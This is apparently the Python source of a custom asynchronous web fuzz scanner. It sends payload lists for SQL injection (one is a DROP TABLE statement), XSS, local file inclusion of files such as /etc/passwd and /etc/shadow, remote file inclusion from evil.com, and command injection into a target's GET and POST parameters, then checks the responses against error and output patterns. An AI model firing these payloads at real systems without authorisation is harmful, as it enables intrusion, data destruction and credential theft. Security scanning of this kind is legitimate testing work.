"""
自定义 Fuzz 扫描工具

作者: Ai_Test_Agent Team
"""
import asyncio
import aiohttp
import json
import logging
import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger(__name__)


class FuzzRunner:
    """自定义 Fuzz 扫描器"""
    
    def __init__(self):
        self.tool_name = "fuzz"
        self.session = None
    
    async def run(self, target: str, config: Dict = None) -> List[Dict]:
        """
        运行 Fuzz 扫描
        
        Args:
            target: 扫描目标URL
            config: 扫描配置
            
        Returns:
            List[Dict]: 扫描结果列表
        """
        config = config or {}
        results = []
        
        # 创建HTTP会话
        timeout = aiohttp.ClientTimeout(total=config.get("timeout", 30))
        connector = aiohttp.TCPConnector(limit=10)
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=config.get("headers", {})
        ) as session:
            self.session = session
            
            # 执行不同类型的Fuzz测试
            if config.get("test_sql", True):
                sql_results = await self._fuzz_sql_injection(target, config)
                results.extend(sql_results)
            
            if config.get("test_xss", True):
                xss_results = await self._fuzz_xss(target, config)
                results.extend(xss_results)
            
            if config.get("test_lfi", True):
                lfi_results = await self._fuzz_lfi(target, config)
                results.extend(lfi_results)
            
            if config.get("test_rfi", True):
                rfi_results = await self._fuzz_rfi(target, config)
                results.extend(rfi_results)
            
            if config.get("test_command", True):
                cmd_results = await self._fuzz_command_injection(target, config)
                results.extend(cmd_results)
        
        logger.info(f"Fuzz 扫描完成，发现 {len(results)} 个结果")
        return results
    
    async def _fuzz_sql_injection(self, target: str, config: Dict) -> List[Dict]:
        """SQL注入Fuzz测试"""
        results = []
        
        payloads = [
            "' OR 1=1--",
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND 1=1--",
            "' AND 1=2--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR '1'='1--",
            "') OR ('1'='1--",
            "1' OR '1'='1",
            "1 OR 1=1",
            "1' AND '1'='2",
            "1 AND 1=2"
        ]
        
        for payload in payloads:
            try:
                result = await self._test_payload(target, payload, "sql_injection")
                if result:
                    results.append(result)
                
                # 避免请求过快
                await asyncio.sleep(0.1)
                
            except Exception as e:
                logger.debug(f"SQL Fuzz 测试异常: {e}")
        
        return results
    
    async def _fuzz_xss(self, target: str, config: Dict) -> List[Dict]:
        """XSS Fuzz测试"""
        results = []
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>"
        ]
        
        for payload in payloads:
            try:
                result = await self._test_payload(target, payload, "xss")
                if result:
                    results.append(result)
                
                await asyncio.sleep(0.1)
                
            except Exception as e:
                logger.debug(f"XSS Fuzz 测试异常: {e}")
        
        return results
    
    async def _fuzz_lfi(self, target: str, config: Dict) -> List[Dict]:
        """本地文件包含Fuzz测试"""
        results = []
        
        payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/version",
            "/proc/self/environ",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\win.ini",
            "C:\\boot.ini",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "file:///C:/windows/win.ini"
        ]
        
        for payload in payloads:
            try:
                result = await self._test_payload(target, payload, "lfi")
                if result:
                    results.append(result)
                
                await asyncio.sleep(0.1)
                
            except Exception as e:
                logger.debug(f"LFI Fuzz 测试异常: {e}")
        
        return results
    
    async def _fuzz_rfi(self, target: str, config: Dict) -> List[Dict]:
        """远程文件包含Fuzz测试"""
        results = []
        
        payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.php",
            "ftp://evil.com/shell.txt",
            "http://127.0.0.1/shell.php",
            "http://localhost/shell.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # <?php phpinfo(); ?>
            "expect://id",
            "php://input",
            "php://filter/resource=http://evil.com/shell.txt"
        ]
        
        for payload in payloads:
            try:
                result = await self._test_payload(target, payload, "rfi")
                if result:
                    results.append(result)
                
                await asyncio.sleep(0.1)
                
            except Exception as e:
                logger.debug(f"RFI Fuzz 测试异常: {e}")
        
        return results
    
    async def _fuzz_command_injection(self, target: str, config: Dict) -> List[Dict]:
        """命令注入Fuzz测试"""
        results = []
        
        payloads = [
            "; id",
            "| id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; ls -la",
            "| ls -la",
            "&& ls -la",
            "; whoami",
            "| whoami", 
            "&& whoami",
            "; ping -c 1 127.0.0.1",
            "| ping -c 1 127.0.0.1",
            "&& ping -c 1 127.0.0.1"
        ]
        
        for payload in payloads:
            try:
                result = await self._test_payload(target, payload, "command_injection")
                if result:
                    results.append(result)
                
                await asyncio.sleep(0.1)
                
            except Exception as e:
                logger.debug(f"Command Injection Fuzz 测试异常: {e}")
        
        return results
    
    async def _test_payload(self, target: str, payload: str, vuln_type: str) -> Optional[Dict]:
        """测试单个载荷"""
        parsed_url = urlparse(target)
        
        # 测试GET参数
        if parsed_url.query:
            result = await self._test_get_params(target, payload, vuln_type)
            if result:
                return result
        
        # 测试POST参数（如果有表单）
        result = await self._test_post_params(target, payload, vuln_type)
        if result:
            return result
        
        return None
    
    async def _test_get_params(self, target: str, payload: str, vuln_type: str) -> Optional[Dict]:
        """测试GET参数"""
        parsed_url = urlparse(target)
        params = parse_qs(parsed_url.query)
        
        for param_name in params.keys():
            # 构造测试URL
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            try:
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    
                    # 检查响应
                    if self._check_vulnerability(content, response, payload, vuln_type):
                        return {
                            "tool": "fuzz",
                            "severity": self._get_severity(vuln_type),
                            "title": f"{vuln_type.replace('_', ' ').title()} in parameter '{param_name}'",
                            "description": f"Parameter '{param_name}' is vulnerable to {vuln_type}",
                            "vuln_type": vuln_type,
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "evidence": self._extract_evidence(content, payload),
                            "raw_output": content[:1000]  # 限制长度
                        }
            
            except Exception as e:
                logger.debug(f"GET参数测试异常: {e}")
        
        return None
    
    async def _test_post_params(self, target: str, payload: str, vuln_type: str) -> Optional[Dict]:
        """测试POST参数"""
        # 简单的POST测试
        test_data = {
            "test": payload,
            "input": payload,
            "search": payload,
            "query": payload,
            "name": payload,
            "value": payload
        }
        
        try:
            async with self.session.post(target, data=test_data) as response:
                content = await response.text()
                
                if self._check_vulnerability(content, response, payload, vuln_type):
                    return {
                        "tool": "fuzz",
                        "severity": self._get_severity(vuln_type),
                        "title": f"{vuln_type.replace('_', ' ').title()} in POST data",
                        "description": f"POST parameter is vulnerable to {vuln_type}",
                        "vuln_type": vuln_type,
                        "url": target,
                        "param": "POST_data",
                        "payload": payload,
                        "evidence": self._extract_evidence(content, payload),
                        "raw_output": content[:1000]
                    }
        
        except Exception as e:
            logger.debug(f"POST参数测试异常: {e}")
        
        return None
    
    def _check_vulnerability(self, content: str, response, payload: str, vuln_type: str) -> bool:
        """检查是否存在漏洞"""
        if vuln_type == "sql_injection":
            # SQL错误模式
            sql_errors = [
                "mysql_fetch_array",
                "ORA-01756",
                "Microsoft OLE DB Provider for ODBC Drivers",
                "PostgreSQL query failed",
                "Warning: mysql_",
                "valid MySQL result",
                "MySqlClient.",
                "PostgreSQL.*ERROR",
                "Warning.*\\Wmysql_.*",
                "valid MySQL result",
                "ORA-\\d{5}",
                "Oracle error",
                "Oracle.*Driver",
                "Warning.*\\Woci_.*",
                "Warning.*\\Wpg_.*",
                "valid PostgreSQL result",
                "Npgsql\\.",
                "PG::SyntaxError:",
                "valid PostgreSQL result",
                "SQLServer JDBC Driver",
                "SqlException",
                "SQLite/JDBCDriver",
                "SQLite.Exception",
                "System.Data.SQLite.SQLiteException",
                "Warning.*\\Wsqlite_.*",
                "Warning.*\\WSQLite3::",
                "\\[SQLITE_ERROR\\]"
            ]
            
            for error in sql_errors:
                if re.search(error, content, re.IGNORECASE):
                    return True
        
        elif vuln_type == "xss":
            # 检查载荷是否被反射
            if payload in content:
                return True
        
        elif vuln_type == "lfi":
            # 文件内容模式
            lfi_patterns = [
                "root:.*:0:0:",
                "\\[boot loader\\]",
                "\\[fonts\\]",
                "\\[extensions\\]",
                "\\[MCI Extensions\\]",
                "daemon:.*:1:1:",
                "mysql:.*:27:27:",
                "www-data:.*:33:33:",
                "nobody:.*:65534:65534:"
            ]
            
            for pattern in lfi_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return True
        
        elif vuln_type == "command_injection":
            # 命令执行结果模式
            cmd_patterns = [
                "uid=\\d+\\(.*\\) gid=\\d+\\(.*\\)",  # id命令输出
                "total \\d+",  # ls -la输出
                "drwx",  # 目录权限
                "PING.*bytes of data",  # ping输出
                "64 bytes from"  # ping响应
            ]
            
            for pattern in cmd_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return True
        
        return False
    
    def _get_severity(self, vuln_type: str) -> str:
        """获取漏洞严重程度"""
        severity_map = {
            "sql_injection": "high",
            "xss": "medium",
            "lfi": "medium",
            "rfi": "high",
            "command_injection": "critical"
        }
        return severity_map.get(vuln_type, "medium")
    
    def _extract_evidence(self, content: str, payload: str) -> str:
        """提取证据"""
        # 查找包含载荷的行
        lines = content.split('\n')
        evidence_lines = []
        
        for line in lines:
            if payload in line:
                evidence_lines.append(line.strip())
                if len(evidence_lines) >= 3:  # 最多3行
                    break
        
        return '\n'.join(evidence_lines) if evidence_lines else content[:200]
    
    async def check_available(self) -> bool:
        """检查 Fuzz 工具是否可用"""
        return True  # 自定义工具，总是可用